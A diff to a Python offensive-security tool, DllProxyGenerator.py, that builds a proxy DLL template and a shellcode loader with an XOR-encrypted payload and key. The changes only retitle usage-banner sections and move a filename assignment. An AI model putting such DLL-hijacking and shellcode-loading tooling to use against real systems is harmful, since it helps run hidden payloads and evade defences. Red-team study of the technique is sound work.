@@ -18,7 +18,7 @@ usage = f"""
 Usage: \033[0mDllProxyGenerator.py <dll_path> <output_exe_path> [<shellcode_path> <xor_key>] <cpp_script_path>\033[0m
 
 /-----------------------------------------------------------------------------------------\\
-----------------------------{Success}-Optional-dll-Proxy-Creation--------------------------------
+----------------------------{Success}-dll-Proxy-Creation--------------------------------
 \\-----------------------------------------------------------------------------------------/
 
 <dll_path>\033[0m path to the original DLL to proxy \033[94m(e.g., "C:\Windows\System32\kernel32.dll")\033[0m
@@ -26,7 +26,7 @@ Usage: \033[0mDllProxyGenerator.py <dll_path> <output_exe_path> [<shellcode_path
 <output_exe_path>\033[0m \033[31mABSOLUTE\033[0m final path where you will store your executable Application \033[94m(e.g., C:\path\\to\ShellCodeLoader.exe)\033[0m
 
 /------------------------------------------------------------------------------------------\\
-----------------------------{Success}-Optional-ShellCodeLoader-Creation--------------------------
+----------------------------{Success}-ShellCodeLoader-Creation--------------------------
 \\------------------------------------------------------------------------------------------/
 
 <shellcode_path> \033[0mpath to the shellcode binary file \033[94m(e.g., ".\shellcode.bin")\033[0m
@@ -290,8 +290,8 @@ if __name__ == '__main__':
         shellCodeLoader = shellCodeLoader.replace("SHELLCODE_PLACEHOLDER", shellcode)
         shellCodeLoader = shellCodeLoader.replace("KEY", f'char key[] = "{masterKey}";')
 
-    loaderName = f'{ os.path.basename(exepath.strip(".dll"))} - COMPILE TO EXE.cpp'
     if createProxy:
+        loaderName = f'{ os.path.basename(exepath.strip(".dll"))} - COMPILE TO EXE.cpp'
         with open(os.path.join(os.path.dirname(cppScriptPath), finalProxyName), "w", encoding="utf-8") as f:
             f.write(dllTemplate)
         print(f"{Status} C++ proxy script written to {os.path.abspath(finalProxyName)}")
